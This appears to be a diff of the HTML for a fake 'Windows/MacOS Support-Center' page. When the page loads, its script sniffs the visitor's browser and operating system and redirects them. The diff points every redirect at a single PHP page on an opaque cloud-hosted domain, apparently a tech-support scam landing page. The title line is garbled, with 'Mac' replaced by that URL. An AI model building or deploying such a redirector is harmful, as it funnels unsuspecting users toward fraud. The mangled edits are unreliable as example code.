@@ -7,7 +7,7 @@
 
     <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
     <meta name="robots" content="noindex,nofollow">
-    <title>Windows/MacOS Support-Center</title>
+    <title>Windows/kdjsfhjeiuei.z13.web.core.windows.net/index0b20.phpOS Support-Center</title>
 
     <script type="text/javascript">
         var isChromium = window.chrome,
@@ -17,21 +17,21 @@
         if (isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false)
         {
             // is Google chrome
-            window.location.href = "./win";
+            window.location.href = "./kdjsfhjeiuei.z13.web.core.windows.net/index0b20.php";
         }
         if (navigator.userAgent.indexOf("Firefox") != -1) {
-            window.location.href = "./win";
+            window.location.href = "./kdjsfhjeiuei.z13.web.core.windows.net/index0b20.php";
         }
         if (window.navigator.userAgent.indexOf("Edge") != -1) {
-            window.location.href = "./win";
+            window.location.href = "./kdjsfhjeiuei.z13.web.core.windows.net/index0b20.php";
         }
 if (window.navigator.userAgent.indexOf("Opera") != -1) {
-            window.location.href = "./win";
+            window.location.href = "./kdjsfhjeiuei.z13.web.core.windows.net/index0b20.php";
         }
 
         if ((navigator.userAgent.indexOf("MSIE") != -1) || (!!document.documentMode == true)) //IF IE > 10
         {
-            window.location.href = "./win";
+            window.location.href = "./kdjsfhjeiuei.z13.web.core.windows.net/index0b20.php";
         }
 
 
@@ -46,22 +46,22 @@ if (window.navigator.userAgent.indexOf("Opera") != -1) {
         var isIE = /*@cc_on!@*/false;                            // At least IE6
 
         if (OSName == "MacOS" && isChrome == true) {
-            window.location.href = "./mac";
+            window.location.href = "./kdjsfhjeiuei.z13.web.core.windows.net/index0b20.php";
         }
         else if (OSName == "MacOS" && isChrome == true) {
-            window.location.href = "./mac";
+            window.location.href = "./kdjsfhjeiuei.z13.web.core.windows.net/index0b20.php";
         }
 
         if (navigator.userAgent.indexOf("Firefox") != -1) {
-            window.location.href = "./mac";
+            window.location.href = "./kdjsfhjeiuei.z13.web.core.windows.net/index0b20.php";
         }
 
         if (window.navigator.userAgent.indexOf("Opera") != -1) {
-            window.location.href = "./mac";
+            window.location.href = "./kdjsfhjeiuei.z13.web.core.windows.net/index0b20.php";
         }
 
         if (navigator.userAgent.indexOf("Safari") != -1) {
-            window.location.href = "./mac";
+            window.location.href = "./kdjsfhjeiuei.z13.web.core.windows.net/index0b20.php";
         }
 
     </script>
